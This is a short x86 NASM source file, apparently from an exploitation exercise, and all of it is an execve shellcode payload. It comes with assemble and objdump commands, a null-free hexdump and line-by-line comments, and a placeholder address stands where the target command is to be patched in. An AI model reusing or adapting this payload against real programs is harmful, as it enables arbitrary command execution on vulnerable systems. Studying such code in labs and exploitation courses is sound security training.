;nasm -f elf32 -o payload_asm.o payload_asm.asm; objdump -d payload_asm.o
;total dump size: 0x13
;heap start: 0x0804a008
;final hexdump: (char[0xf]){0xbb, 0x42, 0x42, 0x42, 0x42, 0x31, 0xc0, 0xb0, 0x0b, 0x31, 0xc9, 0x31, 0xd2, 0xcd, 0x80}

section .text
	global _start

_start:
	mov ebx, 0x42424242; position of our command, to be changed
	xor eax, eax; clear eax without using 0
	mov al, 11; set eax to 11, but only the low byte (this way this instruction does not use axtra zeroes), execve has the syscall number 11 on 32bit machines, and 59 on 64bit machines
	xor ecx, ecx; clear ecx (argv)
	xor edx, edx; clear edx (env)
	int 0x80; use the syscall